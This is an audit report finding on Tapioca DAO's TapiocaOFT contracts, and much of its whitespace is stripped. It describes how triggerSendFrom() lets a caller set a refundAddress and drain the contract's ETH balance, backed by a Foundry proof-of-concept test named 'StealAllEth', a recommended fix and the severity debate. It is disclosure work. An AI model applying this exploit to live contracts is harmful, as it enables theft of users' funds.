@@ -1,0 +1,28 @@
+[H-48] triggerSendFrom() will send all the ETH in the destination chain where sendFrom() is called to the refundAddress in the LzCallParams argument
+Submitted by0x73696d616f
+https://github.com/Tapioca-DAO/tapiocaz-audit/blob/bcf61f79464cfdc0484aa272f9f6e28d5de36a8f/contracts/tOFT/BaseTOFT.sol#L99
+https://github.com/Tapioca-DAO/tapiocaz-audit/blob/bcf61f79464cfdc0484aa272f9f6e28d5de36a8f/contracts/tOFT/BaseTOFT.sol#L551
+https://github.com/Tapioca-DAO/tapiocaz-audit/blob/bcf61f79464cfdc0484aa272f9f6e28d5de36a8f/contracts/tOFT/modules/BaseTOFTOptionsModule.sol#L142
+https://github.com/Tapioca-DAO/tapioca-sdk-audit/blob/90d1e8a16ebe278e86720bc9b69596f74320e749/src/contracts/token/oft/v2/BaseOFTV2.sol#L18
+All the ETH in the destination chain wheresendFrom()is called is sent to therefundAddressin theLzCallParams. Thus, forTapiocaOFTs which have ETH as the underlying asseterc, all the funds will be lost if therefundAddressis an address other than theTapiocaOFT.
+Proof of Concept
+sendFrom()uses themsg.valueas native fees to LayerZero, being the excess sent refunded to therefundAddress. InBaseTOFTOptionsModule,sendFromDestination(), which is called when there was atriggerSendFrom()from a source chain which is delivered to the current chain, the value sent to thesendFrom()function isaddress(this).balance:
+function sendFromDestination(bytes memory _payload) public {...ISendFrom(address(this)).sendFrom{value: address(this).balance}(from,lzDstChainId,LzLib.addressToBytes32(from),amount,callParams);...}
+This means that all the balance but the LayerZero message fee will be refunded to therefundAddressin thecallParams, as can be seen in thesendFrom()function:
+functionsendFrom(address_from,uint16_dstChainId,bytes32_toAddress,uint_amount,LzCallParamscalldata_callParams)publicpayablevirtualoverride{_send(_from,_dstChainId,_toAddress,_amount,_callParams.refundAddress,_callParams.zroPaymentAddress,_callParams.adapterParams);}
+The following POC shows that a user that specifies therefundAddressas its address will receive all the ETH balance in theTapiocaOFTcontract minus the LayerZero message fee.
+// SPDX-License-Identifier: UNLICENSEDpragmasolidity^0.8.18;import{Test,console}from"forge-std/Test.sol";import{TapiocaOFT}from"contracts/tOFT/TapiocaOFT.sol";import{BaseTOFTOptionsModule}from"contracts/tOFT/modules/BaseTOFTOptionsModule.sol";import{IYieldBoxBase}from"tapioca-periph/contracts/interfaces/IYieldBoxBase.sol";import{ISendFrom}from"tapioca-periph/contracts/interfaces/ISendFrom.sol";import{ICommonData}from"tapioca-periph/contracts/interfaces/ICommonData.sol";contractTapiocaOFTPOCisTest{addresspublicconstantLZ_ENDPOINT=0x66A71Dcef29A0fFBDBE3c6a460a3B5BC225Cd675;uint16publicconstantPT_SEND_FROM=778;functiontest_POC_TriggerSendFrom_StealAllEth()public{vm.createSelectFork("https://eth.llamarpc.com");addressoptionsModule_=address(newBaseTOFTOptionsModule(address(LZ_ENDPOINT),address(0),IYieldBoxBase(address(2)),"SomeName","SomeSymbol",18,block.chainid));TapiocaOFTtapiocaOft_=newTapiocaOFT(LZ_ENDPOINT,address(0),IYieldBoxBase(address(3)),"SomeName","SomeSymbol",18,block.chainid,payable(address(1)),payable(address(2)),payable(address(3)),payable(optionsModule_));addressuser_=makeAddr("user");deal(user_,2ether);deal(address(tapiocaOft_),10ether);vm.prank(user_);tapiocaOft_.wrap{value:1ether}(user_,user_,1ether);uint16lzDstChainId_=102;bytesmemoryairdropAdapterParams_;addresszroPaymentAddress_=address(0);uint256amount_=1;ISendFrom.LzCallParamsmemorysendFromData_;sendFromData_.refundAddress=payable(user_);ICommonData.IApproval[]memoryapprovals_;tapiocaOft_.setTrustedRemoteAddress(102,abi.encodePacked(tapiocaOft_));// triggerSendFrom goes through with refundAddress = user_ in the SendFrom call in the destination chainvm.prank(user_);tapiocaOft_.triggerSendFrom{value:1ether}(lzDstChainId_,airdropAdapterParams_,zroPaymentAddress_,amount_,sendFromData_,approvals_);bytesmemorylzPayload_=abi.encode(PT_SEND_FROM,user_,amount_,sendFromData_,102,approvals_);vm.prank(user_);tapiocaOft_.approve(address(tapiocaOft_),amount_);// user has to approve the tOFT contract to spend their tokens in the SendFrom callvm.prank(LZ_ENDPOINT);tapiocaOft_.lzReceive(102,abi.encodePacked(tapiocaOft_,tapiocaOft_),0,lzPayload_);assertGt(user_.balance,10ether);// user received the whole balance of the tOFT contract due to the refund}}
+Tools Used
+Vscode, Foundry
+Recommended Mitigation Steps
+The value sent in thesendFrom()call in theBaseTOFTOptionsModuleshould be sent and forwarded from thetriggerSendFrom()call in the source chain. This way, the user pays the fees from the source chain.
+0xRektora (Tapioca) confirmed and commented:
+Good finding. Technically speaking thesendFrom()will fail if the call was made to the host chain, the one holding the Ether, since LZ have a limit to the amount of value you can send between chain, but nonetheless valid.
+LSDan (Judge) decreased severity to Medium
+0x73696d616f (Warden) commented:
+Hi everyone,This issue should be a valid high as there is no limit on the ETH transferred.
+The ETH is sent to the attacker (or normal user) on the refund of the LayerZero UltraLightNodeV2,here, in the source chain wheresendFrom()is called, not in the destination chain.
+The only cross chain transaction required for this exploit is thetriggerSendFrom(), which sends no ETH to the chain wheresendFrom()is called.
+Thus, the ETH is not actually sent as a cross chain transaction, but sent directly as a refund in the source chain (see the test in the POC) wheresendFrom()is called, not having any limit.Kindly request a review from the judge.
+LSDan (Judge) increase severity to High and commented:
+Thank you for the clarification. You are correct. This is a valid high risk issue.
